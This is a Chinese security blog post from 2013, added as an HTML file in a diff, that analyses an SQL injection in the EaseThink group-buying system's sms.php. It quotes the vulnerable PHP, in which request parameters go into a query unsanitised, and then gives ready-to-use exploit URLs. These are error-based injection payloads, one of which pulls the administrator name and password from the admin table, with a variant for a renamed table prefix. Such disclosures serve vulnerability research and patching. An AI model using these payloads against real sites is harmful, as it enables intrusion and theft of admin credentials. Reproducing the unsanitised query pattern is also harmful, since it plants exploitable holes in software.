@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>易想团购sms.php SQL注入漏洞分析及利用 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-08-06T01:32:44.000Z" itemprop="datePublished">
+          2013-08-06
+      </time>
+    
+</span>
+    <h1 class="post-title">易想团购sms.php SQL注入漏洞分析及利用</h1>
+    <section class="post-content">
+      <p>首发：<a href="http://club.freebuf.com/?/question/416" target="_blank" rel="external">http://club.freebuf.com/?/question/416</a></p>  <p>by 0x53sec <a href="http://www.freebuf.com/author/0x53sec" target="_blank" rel="external">http://www.freebuf.com/author/0x53sec</a></p>  <p><a href="http://Ha.Cker.In/tag/易想团购" target="_blank">易想团购</a>系统sms.php文件里面的几个变量过滤不严格导致了<a href="http://Ha.Cker.In/tag/SQL注射" target="_blank">SQL注入</a>漏洞。 部分代码：</p>  <p>&#160;</p>  <div>   <pre>elseif($_REQUEST[‘act’]==’do_unsubscribe_verify’)<br>{<br>    $code = trim($_REQUEST[‘code’]);<br>    $mobile = trim($_REQUEST[‘mobile’]);<br>    $mobile_item = $GLOBALS[‘db’]-&gt;getRow(&quot;select * from &quot;.DB_PREFIX.&quot;mobile_list where mobile = ‘&quot;.$mobile.&quot;’ and verify_code = ‘&quot;.$code.&quot;’&quot;);  //这里的$mobile和$code变量都只过滤了空格，导致了SQL注入的产生。<br>    if($mobile_item)<br>    {<br>        $GLOBALS[‘db’]-&gt;query(&quot;delete from &quot;.DB_PREFIX.&quot;mobile_list where id = &quot;.$mobile_item[‘id’]);<br>        $result[‘type’] = 1;<br>        ajax_return($result);<br>    }<br>    else<br>    {<br>        $result[‘type’] = 0;<br>        $result[‘message’] = $GLOBALS[‘lang’][‘VERIFY_CODE_ERROR’];<br>        ajax_return($result);<br>    }<br>}<br><span style="color: #0000ff">?&gt;</span></pre><br></div><br><br><br><br><br><p></p>
+
+<p>Exp:</p>
+
+<blockquote><br>  <p>/sms.php?act=do_unsubscribe_verify&amp;code=’%20and (select 1 from (select count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p><br></blockquote>
+
+<p><a href="http://img.cker.in/sms.phpSQL_F691/image.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="295" alt="image" src="http://img.cker.in/sms.phpSQL_F691/image_thumb.png" width="993" border="0"></a> </p>
+
+<p>&#160;</p>
+
+<p>获取管理帐号密码：</p>
+
+<blockquote><br>  <p>/sms.php?act=do_unsubscribe_verify&amp;code=’and (updatexml(1,concat(0x3a,(select concat(adm_name,0x3a,adm_password) from easethink_admin limit 1)),1))%23</p><br></blockquote>
+
+<p>&#160;</p>
+
+<p>改表前缀</p>
+
+<blockquote><br>  <p>/sms.php?act=do_unsubscribe_verify&amp;code=’and (updatexml(1,concat(0x3a,(select concat(adm_name,0x3a,adm_password) from <font color="#ff0000">esjj</font>_admin limit 1)),1))%23</p><br></blockquote>
+
+<p><a href="http://img.cker.in/sms.phpSQL_F691/image_3.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="293" alt="image" src="http://img.cker.in/sms.phpSQL_F691/image_thumb_3.png" width="994" border="0"></a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1017.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1017.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1017.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1017.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1018.seo/">
+        ← Espcms wap 模块SQL注入漏洞
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1016.seo/">
+        PHP  将时间显示为 刚刚  n分钟 小时前 等 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
